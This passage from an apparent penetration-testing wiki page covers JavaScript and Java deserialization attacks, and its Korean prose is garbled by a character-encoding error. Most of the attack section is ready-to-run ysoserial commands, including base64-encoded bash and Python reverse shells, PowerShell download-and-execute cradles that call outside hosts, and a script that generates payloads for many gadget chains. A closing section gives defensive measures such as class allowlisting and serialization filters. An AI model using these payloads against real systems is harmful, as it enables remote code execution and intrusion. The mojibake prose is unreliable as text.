**serialize-javascript** íŒ¨í‚¤ì§€ëŠ” ì˜¤ë¡œì§€ ì§ë ¬í™” ëª©ì ìœ¼ë¡œ ì„¤ê³„ë˜ì—ˆìœ¼ë©° ë‚´ì¥ëœ ì—­ì§ë ¬í™” ê¸°ëŠ¥ì´ ì—†ìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ìì²´ì ìœ¼ë¡œ ì—­ì§ë ¬í™” ë°©ë²•ì„ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤. ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì—­ì§ë ¬í™”í•˜ê¸° ìœ„í•´ ê³µì‹ ì˜ˆì œì—ì„œëŠ” `eval`ì˜ ì§ì ‘ì ì¸ ì‚¬ìš©ì„ ì œì•ˆí•˜ê³  ìˆìŠµë‹ˆë‹¤.
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
ë§Œì•½ ì´ í•¨ìˆ˜ê°€ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤ë©´, ì´ë¥¼ **ì‰½ê²Œ ì•…ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**ë” ë§ì€ ì •ë³´ëŠ” ì´ ì¶œì²˜ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo ë¼ì´ë¸ŒëŸ¬ë¦¬

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaì—ì„œëŠ” **ì—­ì§ë ¬í™” ê³¼ì • ì¤‘ì— ì—­ì§ë ¬í™” ì½œë°±ì´ ì‹¤í–‰**ë©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì•…ì„± í˜ì´ë¡œë“œë¥¼ ì¡°ì‘í•˜ì—¬ ì´ëŸ¬í•œ ì½œë°±ì„ íŠ¸ë¦¬ê±°í•˜ê³ , ì´ë¡œ ì¸í•´ í•´ë¡œìš´ ë™ì‘ì´ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì§€ë¬¸

#### í™”ì´íŠ¸ ë°•ìŠ¤

ì½”ë“œë² ì´ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì§ë ¬í™” ì·¨ì•½ì ì„ ì‹ë³„í•˜ë ¤ë©´ ë‹¤ìŒì„ ê²€ìƒ‰í•˜ì„¸ìš”:

* `Serializable` ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤.
* `java.io.ObjectInputStream`, `readObject`, `readUnshare` í•¨ìˆ˜ì˜ ì‚¬ìš©.

íŠ¹íˆ ë‹¤ìŒì— ì£¼ì˜í•˜ì„¸ìš”:

* ì™¸ë¶€ ì‚¬ìš©ìê°€ ì •ì˜í•œ ë§¤ê°œë³€ìˆ˜ë¡œ ì‚¬ìš©ë˜ëŠ” `XMLDecoder`.
* íŠ¹íˆ XStream ë²„ì „ì´ 1.46 ì´í•˜ì¸ ê²½ìš° `XStream`ì˜ `fromXML` ë©”ì„œë“œëŠ” ì§ë ¬í™” ë¬¸ì œì— ì·¨ì•½í•©ë‹ˆë‹¤.
* `ObjectInputStream`ê³¼ `readObject` ë©”ì„œë“œì˜ ê²°í•©.
* `readObject`, `readObjectNodData`, `readResolve`, ë˜ëŠ” `readExternal`ê³¼ ê°™ì€ ë©”ì„œë“œì˜ êµ¬í˜„.
* `ObjectInputStream.readUnshared`.
* `Serializable`ì˜ ì¼ë°˜ì ì¸ ì‚¬ìš©.

#### ë¸”ë™ ë°•ìŠ¤

ë¸”ë™ ë°•ìŠ¤ í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•´, `ObjectInputStream`ì—ì„œ ìœ ë˜í•œ ìë°” ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ë‚˜íƒ€ë‚´ëŠ” íŠ¹ì • **ì„œëª… ë˜ëŠ” "ë§¤ì§ ë°”ì´íŠ¸"**ë¥¼ ì°¾ìœ¼ì„¸ìš”:

* 16ì§„ìˆ˜ íŒ¨í„´: `AC ED 00 05`.
* Base64 íŒ¨í„´: `rO0`.
* `Content-type`ì´ `application/x-java-serialized-object`ë¡œ ì„¤ì •ëœ HTTP ì‘ë‹µ í—¤ë”.
* ì••ì¶• ì „ 16ì§„ìˆ˜ íŒ¨í„´: `1F 8B 08 00`.
* ì••ì¶• ì „ Base64 íŒ¨í„´: `H4sIA`.
* `.faces` í™•ì¥ìì™€ `faces.ViewState` ë§¤ê°œë³€ìˆ˜ë¥¼ ê°€ì§„ ì›¹ íŒŒì¼. ì´ëŸ¬í•œ íŒ¨í„´ì„ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œê²¬í•˜ë©´ [Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md)ì— ìì„¸íˆ ì„¤ëª…ëœ ëŒ€ë¡œ ì¡°ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤.
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### ì·¨ì•½ì  ì—¬ë¶€ í™•ì¸í•˜ê¸°

ë§Œì•½ **Java ì—­ì§ë ¬í™” ì·¨ì•½ì ì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë°°ìš°ê³  ì‹¶ë‹¤ë©´**, [**ê¸°ë³¸ Java ì—­ì§ë ¬í™”**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS ì—­ì§ë ¬í™”**](java-dns-deserialization-and-gadgetprobe.md), ê·¸ë¦¬ê³  [**CommonsCollection1 í˜ì´ë¡œë“œ**](java-transformers-to-rutime-exec-payload.md)ë¥¼ ì‚´í´ë³´ì„¸ìš”.

#### í™”ì´íŠ¸ë°•ìŠ¤ í…ŒìŠ¤íŠ¸

ì•Œë ¤ì§„ ì·¨ì•½ì ì„ ê°€ì§„ ì–´ë–¤ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
**Exploit**

#### ysoserial

Java ì§ë ¬í™” ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ì£¼ìš” ë„êµ¬ëŠ” [**ysoserial**](https://github.com/frohoff/ysoserial)ì…ë‹ˆë‹¤ ([**ì—¬ê¸°ì—ì„œ ë‹¤ìš´ë¡œë“œ**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). ë³µì¡í•œ ëª…ë ¹ì–´ (ì˜ˆ: íŒŒì´í”„ ì‚¬ìš©)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)ë„ ê³ ë ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ë„êµ¬ëŠ” ì£¼ë¡œ **`ObjectInputStream`**ì„ ì•…ìš©í•˜ëŠ” ë° ì´ˆì ì„ ë§ì¶”ê³  ìˆìŠµë‹ˆë‹¤.\
ì¸ì ì…˜ ê°€ëŠ¥ ì—¬ë¶€ë¥¼ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ RCE í˜ì´ë¡œë“œë³´ë‹¤ëŠ” "URLDNS" í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ "URLDNS" í˜ì´ë¡œë“œê°€ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆì§€ë§Œ ë‹¤ë¥¸ RCE í˜ì´ë¡œë“œëŠ” ì‘ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
**java.lang.Runtime.exec()**ì— ëŒ€í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•  ë•Œ, ">" ë˜ëŠ” "|"ì™€ ê°™ì€ íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹¤í–‰ ê²°ê³¼ë¥¼ ë¦¬ë””ë ‰ì…˜í•˜ê±°ë‚˜, ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ "$()"ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜, ê³µë°±ìœ¼ë¡œ êµ¬ë¶„ëœ ì¸ìˆ˜ë¥¼ ëª…ë ¹ì— ì „ë‹¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤ (`echo -n "hello world"`ëŠ” ê°€ëŠ¥í•˜ì§€ë§Œ `python2 -c 'print "Hello world"'`ëŠ” ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤). í˜ì´ë¡œë“œë¥¼ ì˜¬ë°”ë¥´ê²Œ ì¸ì½”ë”©í•˜ê¸° ìœ„í•´ [ì´ ì›¹í˜ì´ì§€](http://www.jackson-t.ca/runtime-exec-payloads.html)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½í•œ ì›¹ í˜ì´ì§€ì—ì„œ **Windowsì™€ Linuxì— ëŒ€í•œ ëª¨ë“  ê°€ëŠ¥í•œ ì½”ë“œ ì‹¤í–‰** í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ììœ ë¡­ê²Œ ì‚¬ìš©í•˜ì„¸ìš”:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### ì‹œë¦¬ì–¼ í‚¬ëŸ¬ ë°”ì´íŒ¨ìŠ¤ ê°€ì ¯

[https://github.com/pwntester/SerialKillerBypassGadgetCollection](https://github.com/pwntester/SerialKillerBypassGadgetCollection)ì„ **ì‚¬ìš©í•˜ì—¬** ysoserialê³¼ í•¨ê»˜ ë” ë§ì€ ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë„êµ¬ê°€ ë°œí‘œëœ **ìŠ¬ë¼ì´ë“œ**ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec)ì€ Javaì—ì„œ ë‹¤ì–‘í•œ **Json** ë° **Yml** ì§ë ¬í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í”„ë¡œì íŠ¸ë¥¼ ì»´íŒŒì¼í•˜ê¸° ìœ„í•´ `pom.xml`ì— ë‹¤ìŒ **ì˜ì¡´ì„±**ì„ ì¶”ê°€í•´ì•¼ í–ˆìŠµë‹ˆë‹¤:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenì„ ì„¤ì¹˜**í•˜ê³  í”„ë¡œì íŠ¸ë¥¼ **ì»´íŒŒì¼**í•˜ì„¸ìš”:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ì´ Java JSON ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ì„¸ìš”: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* ë§Œì•½ ysoserial í˜ì´ë¡œë“œë¥¼ í…ŒìŠ¤íŠ¸í•˜ê³  ì‹¶ë‹¤ë©´ **ì´ ì›¹ì•±ì„ ì‹¤í–‰**í•´ë³´ì„¸ìš”: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ì™œ

JavaëŠ” ë‹¤ì–‘í•œ ëª©ì ìœ¼ë¡œ ì§ë ¬í™”ë¥¼ ë§ì´ ì‚¬ìš©í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

- **HTTP ìš”ì²­**: ì§ë ¬í™”ëŠ” ë§¤ê°œë³€ìˆ˜, ViewState, ì¿ í‚¤ ë“±ì„ ê´€ë¦¬í•˜ëŠ” ë° ë„ë¦¬ ì‚¬ìš©ë©ë‹ˆë‹¤.
- **RMI (Remote Method Invocation)**: ì§ë ¬í™”ì— ì™„ì „íˆ ì˜ì¡´í•˜ëŠ” Java RMI í”„ë¡œí† ì½œì€ Java ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì›ê²© í†µì‹ ì˜ ê¸°ë°˜ì…ë‹ˆë‹¤.
- **RMI over HTTP**: ì´ ë°©ë²•ì€ Java ê¸°ë°˜ì˜ ë‘êº¼ìš´ í´ë¼ì´ì–¸íŠ¸ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë©°, ëª¨ë“  ê°ì²´ í†µì‹ ì— ëŒ€í•´ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
- **JMX (Java Management Extensions)**: JMXëŠ” ê°ì²´ë¥¼ ë„¤íŠ¸ì›Œí¬ ìƒì—ì„œ ì „ì†¡í•˜ê¸° ìœ„í•´ ì§ë ¬í™”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.
- **ì‚¬ìš©ì ì •ì˜ í”„ë¡œí† ì½œ**: Javaì—ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì›ì‹œ Java ê°ì²´ì˜ ì „ì†¡ì´ ê´€í–‰ì´ë©°, ì´ëŠ” ë‹¤ê°€ì˜¤ëŠ” ì•…ìš© ì˜ˆì œì—ì„œ ì„¤ëª…ë  ê²ƒì…ë‹ˆë‹¤.

### ì˜ˆë°©

#### Transient ê°ì²´

`Serializable`ì„ êµ¬í˜„í•˜ëŠ” í´ë˜ìŠ¤ëŠ” í´ë˜ìŠ¤ ë‚´ë¶€ì˜ ì§ë ¬í™”ë˜ì§€ ì•Šì•„ì•¼ í•˜ëŠ” ê°ì²´ë¥¼ `transient`ë¡œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### `Serializable`ì„ êµ¬í˜„í•´ì•¼ í•˜ëŠ” í´ë˜ìŠ¤ì˜ ì§ë ¬í™” í”¼í•˜ê¸°

í´ë˜ìŠ¤ ê³„ì¸µ êµ¬ì¡°ë¡œ ì¸í•´ íŠ¹ì • **ê°ì²´ê°€ `Serializable` ì¸í„°í˜ì´ìŠ¤ë¥¼ êµ¬í˜„í•´ì•¼ í•˜ëŠ”** ìƒí™©ì—ì„œëŠ”, ì˜ë„í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ì˜ ìœ„í—˜ì´ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì´ í•­ìƒ ì˜ˆì™¸ë¥¼ throwí•˜ëŠ” `final` `readObject()` ë©”ì„œë“œë¥¼ ì •ì˜í•˜ì—¬ ì´ëŸ¬í•œ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë˜ì§€ ì•Šë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaì—ì„œ ì—­ì§ë ¬í™” ë³´ì•ˆ ê°•í™”í•˜ê¸°**

**`java.io.ObjectInputStream`ì„ ì‚¬ìš©ì ì •ì˜í•˜ëŠ” ê²ƒ**ì€ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´ì•ˆí•˜ëŠ” ì‹¤ìš©ì ì¸ ë°©ë²•ì…ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì€ ê²½ìš°ì— ì í•©í•©ë‹ˆë‹¤:

- ì—­ì§ë ¬í™” ì½”ë“œê°€ ì œì–´ ê°€ëŠ¥í•œ ê²½ìš°.
- ì—­ì§ë ¬í™”ë¥¼ ìœ„í•´ ì˜ˆìƒë˜ëŠ” í´ë˜ìŠ¤ê°€ ì•Œë ¤ì§„ ê²½ìš°.

**`resolveClass()`** ë©”ì„œë“œë¥¼ ì˜¤ë²„ë¼ì´ë“œí•˜ì—¬ í—ˆìš©ëœ í´ë˜ìŠ¤ì— ëŒ€í•œ ì—­ì§ë ¬í™”ë¥¼ ì œí•œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ `Bicycle` í´ë˜ìŠ¤ì— ëŒ€í•œ ì—­ì§ë ¬í™”ë§Œ í—ˆìš©í•˜ëŠ” ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ ëª…ì‹œì ìœ¼ë¡œ í—ˆìš©ëœ í´ë˜ìŠ¤ ì´ì™¸ì˜ í´ë˜ìŠ¤ì˜ ì—­ì§ë ¬í™”ë¥¼ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ë³´ì•ˆ ê°•í™”ë¥¼ ìœ„í•œ Java ì—ì´ì „íŠ¸ ì‚¬ìš©**ì€ ì½”ë“œ ìˆ˜ì •ì´ ë¶ˆê°€ëŠ¥í•œ ê²½ìš° ëŒ€ì•ˆì ì¸ í•´ê²°ì±…ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì£¼ë¡œ **ìœ í•´í•œ í´ë˜ìŠ¤ë¥¼ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ì¶”ê°€**í•˜ëŠ” ë°ì— ì ìš©ë˜ë©°, JVM ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤:
```
-javaagent:name-of-agent.jar
```
ë‹¤ìŒì€ deserializationì„ ë™ì ìœ¼ë¡œ ë³´í˜¸í•˜ëŠ” ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤. ì¦‰, ì¦‰ê°ì ì¸ ì½”ë“œ ë³€ê²½ì´ ë¶ˆê°€ëŠ¥í•œ í™˜ê²½ì— ì´ìƒì ì…ë‹ˆë‹¤.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)ì—ì„œ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”.


**Serialization Filters êµ¬í˜„**: Java 9ì—ì„œëŠ” **`ObjectInputFilter`** ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ serialization í•„í„°ë¥¼ ë„ì…í•˜ì—¬, ì—­ì§ë ¬í™”ë˜ê¸° ì „ì— ì§ë ¬í™”ëœ ê°ì²´ê°€ ì¶©ì¡±í•´ì•¼ í•˜ëŠ” ê¸°ì¤€ì„ ì§€ì •í•˜ëŠ” ê°•ë ¥í•œ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ í•„í„°ëŠ” ì „ì—­ì ìœ¼ë¡œ ì ìš©ë˜ê±°ë‚˜ ìŠ¤íŠ¸ë¦¼ë³„ë¡œ ì ìš©ë  ìˆ˜ ìˆì–´ ì—­ì§ë ¬í™” ê³¼ì •ì— ëŒ€í•œ ì„¸ë°€í•œ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

Serialization í•„í„°ë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ëª¨ë“  ì—­ì§ë ¬í™” ì‘ì—…ì— ì ìš©ë˜ëŠ” ì „ì—­ í•„í„°ë¥¼ ì„¤ì •í•˜ê±°ë‚˜ íŠ¹ì • ìŠ¤íŠ¸ë¦¼ì— ëŒ€í•´ ë™ì ìœ¼ë¡œ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
